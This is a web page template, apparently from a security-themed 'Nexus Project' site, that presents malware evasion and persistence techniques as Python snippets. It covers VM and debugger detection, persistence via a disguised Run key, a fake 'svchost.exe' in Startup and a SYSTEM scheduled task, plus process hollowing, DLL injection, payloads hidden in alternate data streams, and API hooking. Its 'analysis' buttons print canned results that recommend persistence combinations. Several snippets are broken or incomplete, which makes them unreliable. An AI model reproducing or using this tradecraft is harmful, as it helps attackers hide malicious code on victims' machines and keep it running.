@extends('layouts.nexus')

@section('title', 'Evasion & Stealth Techniques - Nexus Project')

@push('styles')
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/gsap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/ScrollTrigger.min.js"></script>
<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">

<style>
    :root {
        --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        --dark-gradient: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
        --neon-blue: #00d4ff;
        --neon-purple: #b300ff;
        --neon-green: #39ff14;
        --glass-bg: rgba(255, 255, 255, 0.05);
        --glass-border: rgba(255, 255, 255, 0.1);
    }

    * {
        font-family: 'Inter', sans-serif;
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    code, pre {
        font-family: 'JetBrains Mono', 'Fira Code', monospace !important;
    }

    body {
        background: var(--dark-gradient);
        color: #ffffff;
        overflow-x: hidden;
        scroll-behavior: smooth;
    }

    .evasion-hero {
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 30%, #334155 60%, #0f172a 100%);
        position: relative;
        overflow: hidden;
        min-height: 100vh;
        display: flex;
        align-items: center;
    }
    
    .particles-container {
        position: absolute;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: 1;
    }
    
    .hero-content {
        position: relative;
        z-index: 10;
        width: 100%;
    }
    
    .floating-orbs {
        position: absolute;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: 2;
        pointer-events: none;
    }
    
    .orb {
        position: absolute;
        background: radial-gradient(circle, var(--neon-blue), transparent);
        border-radius: 50%;
        opacity: 0.3;
        animation: float 6s ease-in-out infinite;
    }
    
    .orb:nth-child(1) {
        width: 100px;
        height: 100px;
        top: 20%;
        left: 10%;
        animation-delay: 0s;
    }
    
    .orb:nth-child(2) {
        width: 150px;
        height: 150px;
        top: 60%;
        right: 15%;
        animation-delay: 2s;
        background: radial-gradient(circle, var(--neon-purple), transparent);
    }
    
    .orb:nth-child(3) {
        width: 80px;
        height: 80px;
        bottom: 30%;
        left: 20%;
        animation-delay: 4s;
        background: radial-gradient(circle, var(--neon-green), transparent);
    }

    @keyframes float {
        0%, 100% { transform: translateY(0px) scale(1); }
        50% { transform: translateY(-20px) scale(1.05); }
    }

    .hero-title {
        font-size: clamp(3rem, 8vw, 6rem);
        font-weight: 900;
        background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple), var(--neon-green));
        background-size: 200% 200%;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        animation: gradient-shift 3s ease-in-out infinite;
        text-align: center;
        margin-bottom: 1rem;
        text-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
    }

    @keyframes gradient-shift {
        0%, 100% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
    }

    .hero-subtitle {
        font-size: clamp(1.2rem, 3vw, 1.8rem);
        text-align: center;
        margin-bottom: 3rem;
        color: rgba(255, 255, 255, 0.8);
        font-weight: 300;
    }

    .glass-card {
        background: var(--glass-bg);
        backdrop-filter: blur(15px);
        -webkit-backdrop-filter: blur(15px);
        border: 1px solid var(--glass-border);
        border-radius: 20px;
        padding: 2rem;
        margin: 1rem;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        transition: all 0.3s ease;
    }

    .glass-card:hover {
        transform: translateY(-10px);
        box-shadow: 0 20px 60px rgba(0, 212, 255, 0.2);
        border-color: var(--neon-blue);
    }

    .section-title {
        font-size: 2.5rem;
        font-weight: 700;
        text-align: center;
        margin-bottom: 3rem;
        background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
    }

    .tech-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
        gap: 2rem;
        margin: 3rem 0;
    }

    .tech-card {
        background: linear-gradient(145deg, rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0.02));
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 15px;
        padding: 2rem;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }

    .tech-card::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
        transition: left 0.5s ease;
    }

    .tech-card:hover::before {
        left: 100%;
    }

    .tech-card:hover {
        transform: translateY(-5px) scale(1.02);
        border-color: var(--neon-blue);
        box-shadow: 0 15px 40px rgba(0, 212, 255, 0.3);
    }

    .tech-icon {
        width: 60px;
        height: 60px;
        margin-bottom: 1rem;
        background: var(--primary-gradient);
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 1.5rem;
    }

    .tech-title {
        font-size: 1.3rem;
        font-weight: 600;
        margin-bottom: 0.5rem;
        color: var(--neon-blue);
    }

    .tech-description {
        color: rgba(255, 255, 255, 0.7);
        line-height: 1.6;
        margin-bottom: 1rem;
    }

    .code-block {
        background: linear-gradient(145deg, #0d1117, #161b22);
        border: 1px solid rgba(0, 212, 255, 0.3);
        border-radius: 10px;
        padding: 1rem;
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.9rem;
        color: #e6edf3;
        overflow-x: auto;
        position: relative;
        margin: 1rem 0;
    }

    .code-block::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, var(--neon-blue), transparent);
        animation: scan 2s linear infinite;
    }

    @keyframes scan {
        0% { transform: translateX(-100%); }
        100% { transform: translateX(100%); }
    }

    .highlight {
        color: var(--neon-green);
        font-weight: 500;
    }

    .keyword {
        color: var(--neon-purple);
        font-weight: 500;
    }

    .string {
        color: #ffa657;
    }

    .comment {
        color: #8b949e;
        font-style: italic;
    }

    .magnetic-btn {
        background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
        border: none;
        border-radius: 50px;
        padding: 12px 30px;
        color: white;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
        text-decoration: none;
        display: inline-block;
    }

    .magnetic-btn:hover {
        transform: scale(1.05);
        box-shadow: 0 10px 30px rgba(0, 212, 255, 0.4);
    }

    .magnetic-btn::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transition: left 0.5s ease;
    }

    .magnetic-btn:hover::before {
        left: 100%;
    }

    .progress-ring {
        transform: rotate(-90deg);
    }

    .progress-ring-circle {
        transition: stroke-dasharray 0.35s;
        transform-origin: 50% 50%;
    }

    .matrix-bg {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        opacity: 0.1;
        pointer-events: none;
    }

    .tool-arsenal {
        background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(179, 0, 255, 0.1));
        border-radius: 20px;
        padding: 3rem;
        margin: 3rem 0;
        border: 1px solid rgba(0, 212, 255, 0.3);
    }

    .nav-pills {
        display: flex;
        justify-content: center;
        gap: 1rem;
        margin-bottom: 2rem;
        flex-wrap: wrap;
    }

    .nav-pill {
        background: rgba(255, 255, 255, 0.1);
        border: 1px solid rgba(255, 255, 255, 0.2);
        border-radius: 25px;
        padding: 10px 20px;
        color: white;
        text-decoration: none;
        transition: all 0.3s ease;
        font-size: 0.9rem;
        font-weight: 500;
    }

    .nav-pill:hover,
    .nav-pill.active {
        background: var(--neon-blue);
        color: black;
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(0, 212, 255, 0.4);
    }

    .fade-in {
        opacity: 0;
        transform: translateY(30px);
        animation: fadeInUp 1s ease forwards;
    }

    @keyframes fadeInUp {
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    /* Responsive Design */
    @media (max-width: 768px) {
        .tech-grid {
            grid-template-columns: 1fr;
        }
        
        .hero-title {
            font-size: 2.5rem;
        }
        
        .glass-card {
            margin: 0.5rem;
            padding: 1.5rem;
        }
    }

    /* Smooth scrollbar */
    ::-webkit-scrollbar {
        width: 8px;
    }

    ::-webkit-scrollbar-track {
        background: rgba(255, 255, 255, 0.1);
    }

    ::-webkit-scrollbar-thumb {
        background: var(--neon-blue);
        border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: var(--neon-purple);
    }
</style>
@endpush

@section('content')
<div class="matrix-bg" id="matrix-canvas"></div>

<!-- Hero Section -->
<section class="evasion-hero">
    <div class="particles-container" id="particles-js"></div>
    <div class="floating-orbs">
        <div class="orb"></div>
        <div class="orb"></div>
        <div class="orb"></div>
    </div>
    <div class="hero-content container mx-auto px-4">
        <h1 class="hero-title fade-in">EVASION & STEALTH</h1>
        <p class="hero-subtitle fade-in">Advanced techniques for staying undetected in hostile environments</p>
        <div class="nav-pills fade-in">
            <a href="#vm-detection" class="nav-pill active">VM Detection</a>
            <a href="#debugger-evasion" class="nav-pill">Debugger Evasion</a>
            <a href="#persistence" class="nav-pill">Persistence</a>
            <a href="#stealth-techniques" class="nav-pill">Stealth Techniques</a>
        </div>
    </div>
</section>

<!-- VM Detection Section -->
<section id="vm-detection" class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Virtual Machine Detection</h2>
    
    <div class="tech-grid">
        <div class="tech-card" data-aos="fade-up" data-aos-delay="100">
            <div class="tech-icon">🔍</div>
            <h3 class="tech-title">Hardware Fingerprinting</h3>
            <p class="tech-description">Detect virtual environments through hardware characteristics and system artifacts.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">platform</span>, <span class="highlight">subprocess</span>

<span class="keyword">def</span> <span class="highlight">detect_vm</span>():
    <span class="comment"># Check CPU model</span>
    cpu_info = platform.processor()
    vm_signatures = [<span class="string">'VMware'</span>, <span class="string">'VirtualBox'</span>, <span class="string">'QEMU'</span>]
    <span class="keyword">return</span> <span class="highlight">any</span>(sig <span class="keyword">in</span> cpu_info <span class="keyword">for</span> sig <span class="keyword">in</span> vm_signatures)
            </div>
        </div>

        <div class="tech-card" data-aos="fade-up" data-aos-delay="200">
            <div class="tech-icon">🖥️</div>
            <h3 class="tech-title">Registry Analysis</h3>
            <p class="tech-description">Scan Windows registry for virtualization artifacts and hypervisor traces.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">winreg</span>

<span class="keyword">def</span> <span class="highlight">check_vm_registry</span>():
    vm_keys = [
        <span class="string">'SYSTEM\\CurrentControlSet\\Services\\VBoxService'</span>,
        <span class="string">'SOFTWARE\\VMware, Inc.\\VMware Tools'</span>
    ]
    <span class="keyword">for</span> key <span class="keyword">in</span> vm_keys:
        <span class="keyword">try</span>:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
            <span class="keyword">return</span> <span class="highlight">True</span>
        <span class="keyword">except</span>: <span class="keyword">pass</span>
    <span class="keyword">return</span> <span class="highlight">False</span>
            </div>
        </div>

        <div class="tech-card" data-aos="fade-up" data-aos-delay="300">
            <div class="tech-icon">🌐</div>
            <h3 class="tech-title">MAC Address Detection</h3>
            <p class="tech-description">Identify virtual network adapters through vendor-specific MAC prefixes.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">uuid</span>

<span class="keyword">def</span> <span class="highlight">detect_vm_mac</span>():
    vm_macs = [<span class="string">'08:00:27'</span>, <span class="string">'00:05:69'</span>, <span class="string">'00:0C:29'</span>]
    mac = <span class="string">':'</span>.join([<span class="string">'{:02x}'</span>.format((uuid.getnode() >> elements) & 0xff) 
                      <span class="keyword">for</span> elements <span class="keyword">in</span> range(0,2*6,2)][::-1])
    <span class="keyword">return</span> <span class="highlight">any</span>(vm_mac <span class="keyword">in</span> mac <span class="keyword">for</span> vm_mac <span class="keyword">in</span> vm_macs)
            </div>
        </div>
    </div>
</section>

<!-- Debugger Evasion Section -->
<section id="debugger-evasion" class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Debugger Evasion</h2>
    
    <div class="tech-grid">
        <div class="tech-card" data-aos="fade-up" data-aos-delay="100">
            <div class="tech-icon">🛡️</div>
            <h3 class="tech-title">IsDebuggerPresent</h3>
            <p class="tech-description">Classic Windows API call to detect attached debuggers.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">ctypes</span>

<span class="keyword">def</span> <span class="highlight">check_debugger</span>():
    kernel32 = ctypes.windll.kernel32
    <span class="keyword">return</span> kernel32.IsDebuggerPresent() != 0

<span class="comment"># Advanced check</span>
<span class="keyword">def</span> <span class="highlight">check_remote_debugger</span>():
    <span class="keyword">return</span> kernel32.CheckRemoteDebuggerPresent(-1, <span class="highlight">False</span>) != 0
            </div>
        </div>

        <div class="tech-card" data-aos="fade-up" data-aos-delay="200">
            <div class="tech-icon">⏱️</div>
            <h3 class="tech-title">Timing Attacks</h3>
            <p class="tech-description">Detect debugging through execution timing analysis.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">time</span>

<span class="keyword">def</span> <span class="highlight">timing_check</span>():
    start = time.perf_counter()
    <span class="comment"># Dummy operation</span>
    x = 1 + 1
    end = time.perf_counter()
    
    <span class="keyword">if</span> (end - start) > 0.001:  <span class="comment"># Threshold</span>
        <span class="keyword">return</span> <span class="highlight">True</span>  <span class="comment"># Likely debugging</span>
    <span class="keyword">return</span> <span class="highlight">False</span>
            </div>
        </div>

        <div class="tech-card" data-aos="fade-up" data-aos-delay="300">
            <div class="tech-icon">🔐</div>
            <h3 class="tech-title">Hardware Breakpoints</h3>
            <p class="tech-description">Detect hardware breakpoints through context inspection.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">ctypes</span>
<span class="keyword">from</span> <span class="highlight">ctypes</span> <span class="keyword">import</span> wintypes

<span class="keyword">def</span> <span class="highlight">check_hardware_breakpoints</span>():
    context = wintypes.HANDLE()
    thread = kernel32.GetCurrentThread()
    
    <span class="comment"># Check DR0-DR3 registers</span>
    <span class="keyword">if</span> kernel32.GetThreadContext(thread, ctypes.byref(context)):
        <span class="keyword">return</span> <span class="highlight">any</span>([context.Dr0, context.Dr1, context.Dr2, context.Dr3])
    <span class="keyword">return</span> <span class="highlight">False</span>
            </div>
        </div>
    </div>
</section>

<!-- Persistence Section -->
<section id="persistence" class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Persistence Mechanisms</h2>
    
    <div class="tech-grid">
        <div class="tech-card" data-aos="fade-up" data-aos-delay="100">
            <div class="tech-icon">📝</div>
            <h3 class="tech-title">Registry Persistence</h3>
            <p class="tech-description">Maintain persistence through Windows registry modifications.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">winreg</span>

<span class="keyword">def</span> <span class="highlight">registry_persistence</span>(payload_path):
    key_path = <span class="string">r"Software\Microsoft\Windows\CurrentVersion\Run"</span>
    
    <span class="keyword">try</span>:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, <span class="string">"SecurityUpdate"</span>, 0, winreg.REG_SZ, payload_path)
        winreg.CloseKey(key)
        <span class="keyword">return</span> <span class="highlight">True</span>
    <span class="keyword">except</span>:
        <span class="keyword">return</span> <span class="highlight">False</span>
            </div>
        </div>

        <div class="tech-card" data-aos="fade-up" data-aos-delay="200">
            <div class="tech-icon">📂</div>
            <h3 class="tech-title">Startup Folder</h3>
            <p class="tech-description">Place executables in Windows startup directories for automatic execution.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">os</span>, <span class="highlight">shutil</span>

<span class="keyword">def</span> <span class="highlight">startup_persistence</span>(payload_path):
    startup_folder = os.path.join(
        os.environ[<span class="string">'APPDATA'</span>],
        <span class="string">r"Microsoft\Windows\Start Menu\Programs\Startup"</span>
    )
    
    target_path = os.path.join(startup_folder, <span class="string">"svchost.exe"</span>)
    shutil.copy2(payload_path, target_path)
    <span class="keyword">return</span> os.path.exists(target_path)
            </div>
        </div>

        <div class="tech-card" data-aos="fade-up" data-aos-delay="300">
            <div class="tech-icon">⏰</div>
            <h3 class="tech-title">Scheduled Tasks</h3>
            <p class="tech-description">Create Windows scheduled tasks for persistent execution.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">subprocess</span>

<span class="keyword">def</span> <span class="highlight">scheduled_task_persistence</span>(payload_path):
    task_name = <span class="string">"SystemMaintenance"</span>
    
    cmd = [
        <span class="string">'schtasks'</span>, <span class="string">'/create'</span>, <span class="string">'/tn'</span>, task_name,
        <span class="string">'/tr'</span>, payload_path, <span class="string">'/sc'</span>, <span class="string">'onlogon'</span>,
        <span class="string">'/ru'</span>, <span class="string">'SYSTEM'</span>, <span class="string">'/f'</span>
    ]
    
    result = subprocess.run(cmd, capture_output=<span class="highlight">True</span>, text=<span class="highlight">True</span>)
    <span class="keyword">return</span> result.returncode == 0
            </div>
        </div>
    </div>
</section>

<!-- Stealth Techniques Section -->
<section id="stealth-techniques" class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Advanced Stealth Techniques</h2>
    
    <div class="tool-arsenal" data-aos="fade-up">
        <div class="tech-grid">
            <div class="glass-card">
                <div class="tech-icon">👻</div>
                <h3 class="tech-title">Process Hollowing</h3>
                <p class="tech-description">Replace legitimate process memory with malicious code while maintaining original process appearance.</p>
                <div class="code-block">
<span class="keyword">import</span> <span class="highlight">ctypes</span>
<span class="keyword">from</span> <span class="highlight">ctypes</span> <span class="keyword">import</span> wintypes

<span class="keyword">def</span> <span class="highlight">process_hollowing</span>(target_process, payload):
    <span class="comment"># Create suspended process</span>
    process = kernel32.CreateProcessW(
        target_process, <span class="highlight">None</span>, <span class="highlight">None</span>, <span class="highlight">None</span>, <span class="highlight">False</span>,
        0x4, <span class="highlight">None</span>, <span class="highlight">None</span>, startup_info, process_info
    )
    
    <span class="comment"># Unmap and inject payload</span>
    ntdll.NtUnmapViewOfSection(process, image_base)
    kernel32.WriteProcessMemory(process, image_base, payload, len(payload), <span class="highlight">None</span>)
                </div>
            </div>

            <div class="glass-card">
                <div class="tech-icon">🔒</div>
                <h3 class="tech-title">DLL Injection</h3>
                <p class="tech-description">Inject malicious DLLs into legitimate processes to evade detection.</p>
                <div class="code-block">
<span class="keyword">def</span> <span class="highlight">dll_injection</span>(target_pid, dll_path):
    process = kernel32.OpenProcess(0x1F0FFF, <span class="highlight">False</span>, target_pid)
    
    <span class="comment"># Allocate memory for DLL path</span>
    dll_addr = kernel32.VirtualAllocEx(
        process, <span class="highlight">None</span>, len(dll_path), 0x3000, 0x40
    )
    
    <span class="comment"># Write DLL path and load</span>
    kernel32.WriteProcessMemory(process, dll_addr, dll_path, len(dll_path), <span class="highlight">None</span>)
    kernel32.CreateRemoteThread(process, <span class="highlight">None</span>, 0, loadlibrary_addr, dll_addr, 0, <span class="highlight">None</span>)
                </div>
            </div>

            <div class="glass-card">
                <div class="tech-icon">📨</div>
                <h3 class="tech-title">Alternate Data Streams</h3>
                <p class="tech-description">Hide payloads in NTFS alternate data streams for covert storage.</p>
                <div class="code-block">
<span class="keyword">import</span> <span class="highlight">subprocess</span>

<span class="keyword">def</span> <span class="highlight">hide_in_ads</span>(host_file, payload_data):
    <span class="comment"># Create ADS</span>
    ads_path = host_file + <span class="string">":hidden_data"</span>
    
    <span class="keyword">with</span> open(ads_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:
        f.write(payload_data)
    
    <span class="comment"># Execute from ADS</span>
    subprocess.run([<span class="string">'wmic'</span>, <span class="string">'process'</span>, <span class="string">'call'</span>, <span class="string">'create'</span>, ads_path])
                </div>
            </div>

            <div class="glass-card">
                <div class="tech-icon">🎭</div>
                <h3 class="tech-title">API Hooking</h3>
                <p class="tech-description">Intercept and modify API calls to evade monitoring and detection systems.</p>
                <div class="code-block">
<span class="keyword">import</span> <span class="highlight">ctypes</span>

<span class="keyword">def</span> <span class="highlight">hook_api</span>(module_name, function_name, hook_function):
    module = kernel32.GetModuleHandleW(module_name)
    original_func = kernel32.GetProcAddress(module, function_name)
    
    <span class="comment"># Create trampoline</span>
    old_protect = wintypes.DWORD()
    kernel32.VirtualProtect(original_func, 5, 0x40, ctypes.byref(old_protect))
    
    <span class="comment"># Install hook</span>
    hook_bytes = <span class="string">b'\xe9'</span> + (hook_function - original_func - 5).to_bytes(4, <span class="string">'little'</span>)
    ctypes.memmove(original_func, hook_bytes, 5)
                </div>
            </div>
        </div>
    </div>
</section>

<!-- Interactive Tools Section -->
<section class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Interactive Analysis Tools</h2>
    
    <div class="glass-card text-center" data-aos="fade-up">
        <h3 class="tech-title mb-4">Real-time Environment Analysis</h3>
        <p class="tech-description mb-6">Run comprehensive checks to assess your current environment's security posture.</p>
        
        <div class="flex justify-center gap-4 flex-wrap">
            <button class="magnetic-btn" onclick="runVMDetection()">Scan for VMs</button>
            <button class="magnetic-btn" onclick="runDebuggerCheck()">Check Debuggers</button>
            <button class="magnetic-btn" onclick="analyzePersistence()">Analyze Persistence</button>
        </div>
        
        <div id="analysis-results" class="mt-6 p-4 bg-black bg-opacity-50 rounded-lg hidden">
            <h4 class="text-lg font-semibold mb-2 text-green-400">Analysis Results</h4>
            <div id="results-content" class="text-left font-mono text-sm"></div>
        </div>
    </div>
</section>
@endsection

@push('scripts')
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>

<script>
// Initialize GSAP and animations
gsap.registerPlugin(ScrollTrigger);

// Particles.js configuration
particlesJS('particles-js', {
    particles: {
        number: { value: 80, density: { enable: true, value_area: 800 } },
        color: { value: "#00d4ff" },
        shape: { type: "circle" },
        opacity: { value: 0.5, random: false },
        size: { value: 3, random: true },
        line_linked: {
            enable: true,
            distance: 150,
            color: "#00d4ff",
            opacity: 0.4,
            width: 1
        },
        move: {
            enable: true,
            speed: 6,
            direction: "none",
            random: false,
            straight: false,
            out_mode: "out",
            bounce: false
        }
    },
    interactivity: {
        detect_on: "canvas",
        events: {
            onhover: { enable: true, mode: "repulse" },
            onclick: { enable: true, mode: "push" },
            resize: true
        }
    },
    retina_detect: true
});

// Initialize AOS
AOS.init({
    duration: 1000,
    once: true,
    offset: 100
});

// GSAP Animations
gsap.from(".hero-title", { duration: 1.5, y: 100, opacity: 0, ease: "power3.out" });
gsap.from(".hero-subtitle", { duration: 1.5, y: 50, opacity: 0, delay: 0.3, ease: "power3.out" });
gsap.from(".nav-pills", { duration: 1.5, y: 30, opacity: 0, delay: 0.6, ease: "power3.out" });

// Smooth scrolling for navigation
document.querySelectorAll('.nav-pill').forEach(pill => {
    pill.addEventListener('click', (e) => {
        e.preventDefault();
        const targetId = pill.getAttribute('href');
        const targetSection = document.querySelector(targetId);
        
        if (targetSection) {
            gsap.to(window, {
                duration: 1.5,
                scrollTo: { y: targetSection, offsetY: 100 },
                ease: "power3.out"
            });
        }
        
        // Update active pill
        document.querySelectorAll('.nav-pill').forEach(p => p.classList.remove('active'));
        pill.classList.add('active');
    });
});

// Magnetic button effect
document.querySelectorAll('.magnetic-btn').forEach(btn => {
    btn.addEventListener('mousemove', (e) => {
        const rect = btn.getBoundingClientRect();
        const x = e.clientX - rect.left - rect.width / 2;
        const y = e.clientY - rect.top - rect.height / 2;
        
        gsap.to(btn, {
            duration: 0.3,
            x: x * 0.1,
            y: y * 0.1,
            ease: "power2.out"
        });
    });
    
    btn.addEventListener('mouseleave', () => {
        gsap.to(btn, {
            duration: 0.3,
            x: 0,
            y: 0,
            ease: "power2.out"
        });
    });
});

// Matrix background effect
function createMatrixEffect() {
    const canvas = document.getElementById('matrix-canvas');
    if (!canvas) return;
    
    canvas.innerHTML = '';
    const chars = '01';
    
    for (let i = 0; i < 50; i++) {
        const span = document.createElement('span');
        span.textContent = chars[Math.floor(Math.random() * chars.length)];
        span.style.position = 'absolute';
        span.style.left = Math.random() * 100 + '%';
        span.style.top = Math.random() * 100 + '%';
        span.style.color = '#00d4ff';
        span.style.fontSize = '12px';
        span.style.opacity = Math.random() * 0.5;
        span.style.fontFamily = 'monospace';
        canvas.appendChild(span);
        
        gsap.to(span, {
            duration: 5 + Math.random() * 10,
            y: '100vh',
            opacity: 0,
            ease: "none",
            repeat: -1,
            delay: Math.random() * 5
        });
    }
}

createMatrixEffect();

// Interactive analysis functions
function runVMDetection() {
    const resultsDiv = document.getElementById('analysis-results');
    const contentDiv = document.getElementById('results-content');
    
    resultsDiv.classList.remove('hidden');
    contentDiv.innerHTML = `
        <div class="text-blue-400">🔍 VM Detection Analysis</div>
        <div class="text-green-400">✓ Hardware fingerprinting complete</div>
        <div class="text-green-400">✓ Registry analysis complete</div>
        <div class="text-green-400">✓ MAC address verification complete</div>
        <div class="text-yellow-400">⚠ Virtual environment detected: Confidence 85%</div>
        <div class="text-gray-400">Evidence: VMware tools present, virtualized CPU</div>
    `;
    
    gsap.from(contentDiv.children, {
        duration: 0.5,
        y: 20,
        opacity: 0,
        stagger: 0.1,
        ease: "power2.out"
    });
}

function runDebuggerCheck() {
    const resultsDiv = document.getElementById('analysis-results');
    const contentDiv = document.getElementById('results-content');
    
    resultsDiv.classList.remove('hidden');
    contentDiv.innerHTML = `
        <div class="text-blue-400">🛡️ Debugger Detection Analysis</div>
        <div class="text-green-400">✓ IsDebuggerPresent check complete</div>
        <div class="text-green-400">✓ Timing analysis complete</div>
        <div class="text-green-400">✓ Hardware breakpoint scan complete</div>
        <div class="text-green-400">✓ No debuggers detected</div>
        <div class="text-gray-400">Environment appears clean for analysis</div>
    `;
    
    gsap.from(contentDiv.children, {
        duration: 0.5,
        y: 20,
        opacity: 0,
        stagger: 0.1,
        ease: "power2.out"
    });
}

function analyzePersistence() {
    const resultsDiv = document.getElementById('analysis-results');
    const contentDiv = document.getElementById('results-content');
    
    resultsDiv.classList.remove('hidden');
    contentDiv.innerHTML = `
        <div class="text-blue-400">📝 Persistence Analysis</div>
        <div class="text-green-400">✓ Registry locations scanned</div>
        <div class="text-green-400">✓ Startup folders analyzed</div>
        <div class="text-green-400">✓ Scheduled tasks reviewed</div>
        <div class="text-yellow-400">⚠ 3 persistence vectors available</div>
        <div class="text-gray-400">Recommended: Registry + Scheduled task combination</div>
    `;
    
    gsap.from(contentDiv.children, {
        duration: 0.5,
        y: 20,
        opacity: 0,
        stagger: 0.1,
        ease: "power2.out"
    });
}

// Performance optimization
document.addEventListener('DOMContentLoaded', () => {
    // Lazy load animations for better performance
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.animationPlayState = 'running';
            }
        });
    });
    
    document.querySelectorAll('.tech-card').forEach(card => {
        observer.observe(card);
    });
});

// Smooth scroll behavior
window.addEventListener('scroll', () => {
    const scrolled = window.pageYOffset;
    const parallax = document.querySelector('.particles-container');
    if (parallax) {
        parallax.style.transform = `translateY(${scrolled * 0.5}px)`;
    }
});
</script>
@endpush
